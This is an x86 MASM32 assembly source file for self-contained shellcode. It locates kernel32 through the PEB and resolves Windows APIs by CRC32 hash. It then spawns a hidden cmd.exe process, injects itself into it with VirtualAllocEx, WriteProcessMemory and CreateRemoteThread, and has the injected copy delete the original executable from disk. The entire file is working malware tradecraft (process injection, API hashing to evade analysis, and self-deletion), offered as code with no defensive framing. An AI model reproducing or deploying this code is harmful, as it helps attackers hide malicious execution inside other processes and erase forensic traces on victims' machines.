.686
.model flat,stdcall
option casemap:none
assume fs:nothing

include     C:\masm32\include\windows.inc                                  
include     C:\masm32\include\kernel32.inc  
includelib  C:\masm32\lib\kernel32.lib  


BREAK						equ				int 3

APOP_STACK_SIZE				equ				256

APOP_STACK_INPUT			equ				[ebp - 4]
APOP_SHELLCODE_BASE			equ				[ebp - 8]
APOP_KERNEL32				equ				[ebp - 12]
APOP_PROCESSENTRY32			equ				[ebp - 16]
APOP_PROCESSSNAPSHOTHANDLE	equ				[ebp - 20]
APOP_PROC_HANDLE			equ				[ebp - 24]
APOP_PROC_MEMORY			equ				[ebp - 28]
APOP_LOCAL_FILENAME			equ				[ebp - 32]
APOP_PROC_INFO				equ				[ebp - 36]
APOP_STARTUP_INFO			equ				[ebp - 40]
APOP_HUSK_HANDLE			equ				[ebp - 44]

DELETEFILEW					equ				[ebp - 128]
CREATEREMOTETHREAD			equ				[ebp - 132]
VIRTUALALLOCEX				equ				[ebp - 136]
WRITEPROCESSMEMORY			equ				[ebp - 140]
OPENPROCESS					equ				[ebp - 144]
EXITPROCESS					equ				[ebp - 152]
SLEEP						equ				[ebp - 160]
CREATETOOLHELP32SNAPSHOT	equ				[ebp - 164]
PROCESS32FIRST				equ				[ebp - 172]
PROCESS32NEXT				equ				[ebp - 176]
GETMODULEFILENAME			equ				[ebp - 180]
CLOSEHANDLE					equ				[ebp - 184]
CREATEPROCESS				equ				[ebp - 188]

.code

start:
	nop
	call	apop_delta

apop_delta:
	pop		ebx
	lea		ebx, [ebx - 6]
	mov		edx, eax

;	Build stack
	cld
	push	ebp
	mov		ebp, esp
	mov		ecx, APOP_STACK_SIZE
	sub		esp, ecx
	mov		edi, esp
	mov		edx, eax
	xor		al, al
	rep		stosb
	mov		APOP_STACK_INPUT, edx
	mov		APOP_SHELLCODE_BASE, ebx

;	Obtain kernel32 base
	mov		eax, [fs:030h]
	mov		eax, [eax + 0ch]
	mov		eax, [eax + 014h]
	mov		eax, [eax]
	mov		eax, [eax]
	mov		eax, [eax + 010h]
	mov		APOP_KERNEL32, eax

;	Resolve kernel32 functions
;	Resolve DeleteFileW
	mov		esi, 0E2CE2D20h
	call	apop_resolve_function
	mov		DELETEFILEW, eax

;	Resolve CreateRemoteThread
	mov		eax, APOP_KERNEL32
	mov		esi, 0C8E5AF9Ah
	call	apop_resolve_function
	mov		CREATEREMOTETHREAD, eax

;	Resolve VirtualAllocEx
	mov		eax, APOP_KERNEL32
	mov		esi, 08CA62F7Fh
	call	apop_resolve_function
	mov		VIRTUALALLOCEX, eax

;	Resolve GetModuleFilenameW
	mov		eax, APOP_KERNEL32
	mov		esi, 0265A0F76h
	call	apop_resolve_function
	mov		GETMODULEFILENAME, eax

;	Resolve WriteProcessMemory
	mov		eax, APOP_KERNEL32
	mov		esi, 0F3B88ED6h
	call	apop_resolve_function
	mov		WRITEPROCESSMEMORY, eax

;	Resolve OpenProcess
	mov		eax, APOP_KERNEL32
	mov		esi, 026DBA6B4h
	call	apop_resolve_function
	mov		OPENPROCESS, eax

;	Resolve ExitProcess
	mov		eax, APOP_KERNEL32
	mov		esi, 00D3F81C9h
	call	apop_resolve_function
	mov		EXITPROCESS, eax

;	Resolve Sleep
	mov		eax, APOP_KERNEL32
	mov		esi, 0F0F422CCh
	call	apop_resolve_function
	mov		SLEEP, eax

;	Resolve CreateToolhelp32Snapshot
	mov		eax, APOP_KERNEL32
	mov		esi, 0CE067D8Eh
	call	apop_resolve_function
	mov		CREATETOOLHELP32SNAPSHOT, eax

;	Resolve Process32First
	mov		eax, APOP_KERNEL32
	mov		esi, 0101BCC47h
	call	apop_resolve_function
	mov		PROCESS32FIRST, eax

;	Resolve Process32Next
	mov		eax, APOP_KERNEL32
	mov		esi, 0FB715802h
	call	apop_resolve_function
	mov		PROCESS32NEXT, eax

;	Resolve CloseHandle
	;BREAK	
	mov		eax, APOP_KERNEL32
	mov		esi, 0E84033EEh
	call	apop_resolve_function
	mov		CLOSEHANDLE, eax

;	Resolve CreateProcess
	mov		eax, APOP_KERNEL32
	mov		esi, 0BB2D3AC0h
	call	apop_resolve_function
	mov		CREATEPROCESS, eax

;	Obtain the current filename
;DWORD WINAPI GetModuleFileName(
;  _In_opt_  HMODULE hModule,
;  _Out_     LPTSTR lpFilename,
;  _In_      DWORD nSize
;);
	mov		ecx, (MAX_PATH * 2)
	sub		esp, ecx
	mov		edi, esp
	cld
	xor		al, al
	rep		stosb
	mov		APOP_LOCAL_FILENAME, esp
	push	MAX_PATH * 2
	push	APOP_LOCAL_FILENAME
	push	NULL
	mov		eax, GETMODULEFILENAME
	call	eax

;	Determine the entry point
	cmp		DWORD PTR APOP_STACK_INPUT, 0baadf00dh
	je		apop_husk

;	This is the delete entry point, perform operations
	;BREAK
	push	2000d
	mov		eax, SLEEP
	call	eax

;	Delete the file
	mov		eax, APOP_SHELLCODE_BASE
	lea		eax, [eax + (OFFSET apop_end - OFFSET start)]
	push	eax
	mov		eax, DELETEFILEW
	call	eax

;	Exit the husk
	push	0
	mov		eax, EXITPROCESS
	call	eax

;	Create the husk process
apop_husk:
;	CreateProcess(	NULL,;
;					"cmd.exe",
;					NULL,
;					NULL,
;					FALSE,
;					CREATE_NO_WINDOW,
;					NULL,
;					NULL,
;					&startup_info,
;					&proc_info);	
	mov		ecx, (SIZEOF STARTUPINFOA + SIZEOF PROCESS_INFORMATION)
	sub		esp, ecx
	mov		edi, esp
	xor		al, al
	cld	
	rep		stosb

	mov		APOP_PROC_INFO, esp
	lea		eax, [esp + SIZEOF PROCESS_INFORMATION]
	mov		APOP_STARTUP_INFO, eax

	; cmd.exe cmd. exe\0
	push	'exe'
	push	'.dmc'
	mov		eax, esp

	push	APOP_PROC_INFO
	push	APOP_STARTUP_INFO
	push	NULL
	push	NULL
	push	CREATE_NO_WINDOW
	push	FALSE
	push	NULL
	push	NULL
	push	eax
	push	NULL
	mov		eax, CREATEPROCESS
	call	eax
	cmp		eax, 0
	je		apop_quit

	mov		ebx, APOP_PROC_INFO
	assume	ebx:ptr PROCESS_INFORMATION
	mov		eax, [ebx].hProcess
	assume	ebx:nothing

	mov		APOP_HUSK_HANDLE, eax

;	VirtualAllocEx
;LPVOID WINAPI VirtualAllocEx(
;  _In_      HANDLE hProcess,
;  _In_opt_  LPVOID lpAddress,
;  _In_      SIZE_T dwSize,
;  _In_      DWORD flAllocationType,
;  _In_      DWORD flProtect
;);
	push	PAGE_EXECUTE_READWRITE
	push	MEM_COMMIT
	push	02000h
	push	NULL
	push	APOP_HUSK_HANDLE
	mov		eax, VIRTUALALLOCEX
	call	eax
	cmp		eax, 0
	je		apop_quit
	mov		APOP_PROC_MEMORY, eax

;	Copy the shellcode
;BOOL WINAPI WriteProcessMemory(
;  _In_   HANDLE hProcess,
;  _In_   LPVOID lpBaseAddress,
;  _In_   LPCVOID lpBuffer,
;  _In_   SIZE_T nSize,
;  _Out_  SIZE_T *lpNumberOfBytesWritten
;);
	push	0				; junk variable
	mov		eax, esp
	push	eax				; Number of bytes written
	push	DWORD PTR (OFFSET apop_end - OFFSET start)
	push	APOP_SHELLCODE_BASE
	push	APOP_PROC_MEMORY
	push	APOP_HUSK_HANDLE
	mov		eax, WRITEPROCESSMEMORY
	call	eax
	cmp		eax, 0
	je		apop_quit
	
;	Copy the target file name
	pop		eax
	push	0
	mov		eax, esp
	push	eax		; number of bytes etc
	push	DWORD PTR (MAX_PATH * 2)
	push	APOP_LOCAL_FILENAME
	mov		eax, APOP_PROC_MEMORY
	lea		eax, [eax + (OFFSET apop_end - OFFSET start)]
	push	eax
	push	APOP_HUSK_HANDLE
	mov		eax, WRITEPROCESSMEMORY
	call	eax
	cmp		eax, 0
	je		apop_quit
	pop		eax
	
;	Create the thread
;HANDLE WINAPI CreateRemoteThread(
;  _In_   HANDLE hProcess,
;  _In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,
;  _In_   SIZE_T dwStackSize,
;  _In_   LPTHREAD_START_ROUTINE lpStartAddress,
;  _In_   LPVOID lpParameter,
;  _In_   DWORD dwCreationFlags,
;  _Out_  LPDWORD lpThreadId
;);
	;BREAK
	push	0
	mov		eax, esp
	push	eax
	push	0
	push	NULL
	push	APOP_PROC_MEMORY
	push	0
	push	NULL
	push	APOP_HUSK_HANDLE
	mov		eax, CREATEREMOTETHREAD
	call	eax

apop_quit:
	mov		eax, EXITPROCESS
	push	0
	call	eax


;	Resolver function
apop_resolve_function:

	; Find PE
	mov		ebx, [eax + 03ch]
	add		ebx, eax					; PE
	mov		edi, eax					; Commit to edi

	; Find EAT
	mov		ebx, [ebx + 078h]			
	add		ebx, edi					; IMAGE_EXPORT_DIRECTORY
	mov		edx, ebx

	; Find tables
	mov		ebx, [ebx + 020h]			; AddressOfNames
	add		ebx, edi

	; Find first function string
	xor		ecx, ecx
apop_enum_functions:
	mov		eax, [ebx]
	add		eax, edi
	call	apop_crc32
	cmp		eax, esi
	je		apop_found_function
	add		ebx, 4
	inc		ecx
	jmp		apop_enum_functions

apop_found_function:
	;mov		eax, [ebx]
	;add		eax, edi

	mov		ebx, [edx + 024h]
	add		ebx, edi
	mov		cx, [ebx + 2 * ecx]
	mov		ebx, [edx + 01ch]
	add		ebx, edi
	mov		eax, [ebx + 4 * ecx]
	add		eax, edi

	ret

	; Expects	eax		= string
	; Returns  eax		= CRC32
apop_crc32:
	push	ebx
	push	ecx
	xor		ebx, ebx
	dec		ebx
apop_crc32_byte:
	xor		bl, [eax]
	mov		ecx, 8
apop_crc32_bit:
	shr		ebx, 1
	jnc		apop_crc32_skip
	xor		ebx, 08fdb125ch
apop_crc32_skip:
	loop	apop_crc32_bit

	inc		eax
	cmp		byte ptr [eax], 0
	jnz		apop_crc32_byte

	mov		eax, ebx
	pop		ecx
	pop		ebx
	ret	

	nop
	nop
	BREAK
	BREAK         

apop_end:

end start